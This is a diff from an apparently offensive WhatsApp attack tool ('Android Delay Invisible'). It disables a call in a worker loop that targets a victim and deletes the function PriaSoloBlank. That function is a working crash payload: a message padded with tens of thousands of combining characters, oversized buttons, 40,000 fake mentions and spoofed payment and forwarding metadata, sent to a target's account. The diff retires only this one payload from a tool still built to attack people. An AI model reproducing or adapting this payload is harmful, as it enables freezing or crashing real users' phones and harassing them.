@@ -4812,7 +4812,7 @@ Description : Android Delay Invisible
             
             for (let i = 0; i < 3; i++) {
                 try {
-                    await PriaSoloBlank(sock, target);
+                   // await PriaSoloBlank(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -5495,75 +5495,6 @@ async function VogueBuldo(sock, target) {
   }
   await sleep(1500)
 }
-}
-
-async function PriaSoloBlank(sock, target) {
-  const ButtonsX = [];
-
-  for (let i = 0; i < 10; i++) {
-    ButtonsX.push({
-      buttonId: "cta_copy",
-      buttonText: {
-        displayText: "ꦽ".repeat(5000),
-      },
-      type: 4,
-      nativeFlowInfo: {
-        name: "single_select",
-        paramsJson: JSON.stringify({
-          title: "ꦽ".repeat(5000),
-          sections: [
-            {
-              title: "Pria Solo",
-              highlight_label: "label",
-              rows: [],
-            },
-          ],
-        }),
-      },
-    });
-  }
-
-  await sock.sendMessage(
-    target,
-    {
-      text: "ꦽ".repeat(25000),
-      footer: "Pria Solo" + "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
-      viewOnce: true,
-      buttons: ButtonsX,
-      headerType: 1,
-      contextInfo: {
-        participant: target,
-        mentionedJid: [
-          "131338822@s.whatsapp.net",
-          ...Array.from(
-            { length: 40000 },
-            () =>
-              "1" +
-              Math.floor(Math.random() * 5000000) +
-              "@s.whatsapp.net"
-          ),
-        ],
-        remoteJid: "X",
-        forwardingScore: 100,
-        isForwarded: true,
-        stanzaId: "1234567890ABCDEF",
-        quotedMessage: {
-          paymentInviteMessage: {
-            serviceType: 3,
-            expiryTimestamp: Date.now() + 1814400000,
-          },
-        },
-        businessMessageForwardInfo: {
-          businessOwnerJid: target,
-        },
-      },
-    },
-    {
-      ephemeralExpiration: 5,
-      timeStamp: Date.now(),
-      participant: { jid: target },
-    }
-  );
 }
 
 
